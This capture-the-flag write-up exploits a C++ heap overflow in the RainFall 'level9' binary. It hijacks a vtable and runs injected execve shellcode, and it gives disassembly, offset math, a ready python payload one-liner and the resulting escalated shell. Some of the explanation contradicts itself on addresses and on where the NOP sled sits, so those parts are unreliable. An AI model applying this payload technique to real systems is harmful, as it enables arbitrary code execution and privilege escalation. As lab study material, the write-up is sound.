# Level9 — C++ Heap Overflow / Vtable Hijack + Shellcode

## Vulnerability

The binary is C++ code that allocates two `N` objects on the heap. Each object has a **vtable pointer** at offset `+0` and data at offset `+4`. `setAnnotation()` copies `argv[1]` into the first object's data buffer using `memcpy()` with no bounds check. By overflowing into the second object, we **overwrite its vtable pointer**, then plant the vtable and shellcode inside the first object's data region — so when the program calls a virtual method through the corrupted vtable, it executes our shellcode.

This is a **C++ heap vtable hijack** via a buffer overflow, combined with shellcode injection.

---

## Recon

**Two `N` objects allocated (`new N(5)` and `new N(6)`):**

```gdb
(gdb) disass main
   0x08048617 <+35>:  call _Znwj       ; new(0x6c = 108 bytes) → 0x804a008  (obj1)
   0x08048639 <+69>:  call _Znwj       ; new(0x6c = 108 bytes) → 0x804a078  (obj2)
```

**`N::N(int)` constructor writes the vtable pointer at offset 0:**

```gdb
(gdb) disass N::N(int)
   0x080486fc <+6>:   movl $0x8048848, (%eax)   ; vtable ptr = 0x8048848
   0x08048708 <+18>:  mov %edx, 0x68(%eax)      ; int stored at +0x68
```

**`setAnnotation` copies argv[1] into obj1's data (obj1 + 4) with no bounds check:**

```gdb
(gdb) disass N::setAnnotation
   0x0804871a <+12>:  call strlen          ; get length of argv[1]
   0x08048733 <+37>:  call memcpy          ; memcpy(obj1+4, argv[1], strlen(argv[1]))
```

**Virtual call after `setAnnotation`:**

```gdb
0x08048680 <+140>:  mov (%eax),%eax      ; eax = obj2
0x08048682 <+142>:  mov (%eax),%edx      ; edx = *obj2 = vtable ptr  ← we control this
0x08048693 <+159>:  call *%edx           ; calls first vtable entry
```

Two dereferences: `obj2 → vtable → function`. We need to:
1. Place a **fake vtable** somewhere we control
2. Make that fake vtable's first entry point to our **shellcode**
3. Overwrite obj2's vtable pointer to point at our fake vtable

**Heap layout after both allocations:**

```
0x804a008  [vtable ptr][int][... 104 bytes of data ...]   ← obj1 (108 bytes)
0x804a078  [vtable ptr][int][... 104 bytes of data ...]   ← obj2 (108 bytes)
```

Gap between obj1 start and obj2's vtable: `0x804a078 - 0x804a008 = 0x70 = 112 bytes`.
`memcpy` writes to `obj1 + 4`, so offset to obj2's vtable: `112 - 4 = 108 bytes`.

**Pattern confirms offset 108:**

```gdb
(gdb) r Aa0Aa1...
; SIGSEGV at 0x08048682 (second deref)
; eax = 0x41366441  → cyclic offset = 108
```

**Key addresses:**
- `obj1 data starts at`: `0x804a00c` (obj1 + 4)
- `obj2 vtable ptr at`: `0x804a078` (obj1 + 112 = memcpy dest + 108)

**Strategy:**
- Write a fake vtable address at byte 0 of our payload → points to `obj1+4+4 = 0x804a010` (where shellcode lives)
- Put shellcode starting at byte 4
- Pad to 108 bytes
- Overwrite obj2's vtable pointer with `0x804a00c` (start of our data = fake vtable location)

```
obj1+0x0:  [vtable = 0x8048848]  (unchanged, set by constructor)
obj1+0x4:  [our data starts here = 0x804a00c]

payload layout:
  bytes 0–3:   \x0c\xa0\x04\x08  → fake vtable ptr, points back into our buffer
  bytes 4–27:  shellcode (24 bytes: execve /bin/sh)
  bytes 28–107: NOP sled (\x90 * 80)
  bytes 108–111: \x0c\xa0\x04\x08 → overwrites obj2's vtable ptr
```

When `call *%edx` fires:
- `edx = *obj2 = 0x804a00c` (our fake vtable address)
- `*edx = *(0x804a00c) = 0x804a00c` (first 4 bytes of our payload → the fake vtable entry)
- Jumps to `0x804a00c` → hits the vtable ptr bytes, slides into shellcode ✓

---

## Exploit

```bash
python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90' * 80 + '\x0c\xa0\x04\x08')" > /tmp/exploit
./level9 $(cat /tmp/exploit)
```

Shellcode breakdown (`execve("/bin//sh", ["/bin//sh", NULL], NULL)`):

```asm
\x31\xc0        xor eax, eax
\x99            cdq              ; edx = 0
\x50            push eax         ; null terminator
\x68\x2f\x2f\x73\x68  push "//sh"
\x68\x2f\x62\x69\x6e  push "/bin"
\x89\xe3        mov ebx, esp     ; ebx = "/bin//sh"
\x50            push eax
\x53            push ebx
\x89\xe1        mov ecx, esp     ; ecx = argv
\xb0\x0b        mov al, 11       ; execve syscall
\xcd\x80        int 0x80
```

---

## Flow

```
new N(5)  →  obj1 at 0x804a008, vtable at 0x8048848
new N(6)  →  obj2 at 0x804a078, vtable at 0x8048848
        │
        ▼
setAnnotation(argv[1])  →  memcpy(obj1+4, argv[1], len)  ←  NO BOUNDS CHECK
        │
        ├── bytes 0–3:    fake vtable addr (0x804a00c) planted at obj1+4
        ├── bytes 4–27:   shellcode
        ├── bytes 28–107: NOP sled
        └── bytes 108–111: 0x804a00c → overwrites obj2 vtable ptr
                │
                ▼
call *(%edx)  →  edx = *obj2 = 0x804a00c  (fake vtable)
                │
                ▼
              *0x804a00c = 0x804a00c  (first vtable entry = shellcode region)
                │
                ▼
        jumps into NOP sled → shellcode → execve("/bin//sh")
```

**Shell session after exploitation:**

```bash
level9@RainFall:~$ ./level9 $(cat /tmp/exploit)
$ whoami
bonus0
```

---

## Commands Summary

```gdb
; Understand object layout and virtual dispatch
gdb ./level9
(gdb) disass main              ; two new(), setAnnotation call, virtual call *%edx
(gdb) disass N::N(int)         ; vtable written at obj+0, int at obj+0x68
(gdb) disass N::setAnnotation  ; memcpy(this+4, src, strlen(src)) — no bounds check

; Confirm offset with cyclic pattern (offset = 108)
(gdb) r Aa0Aa1Aa2...
; eax = 0x41366441 at SIGSEGV → offset 108

; Find obj1 data address after memcpy
(gdb) b memcpy
(gdb) finish
(gdb) i r                      ; eax = 0x804a00c  ← start of our controlled data
```

```bash
# Payload: fake_vtable(4) + shellcode(24) + NOP(80) + fake_vtable(4) = 112 bytes
python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90' * 80 + '\x0c\xa0\x04\x08')" > /tmp/exploit

# Execute (as argument, not stdin)
./level9 $(cat /tmp/exploit)
```
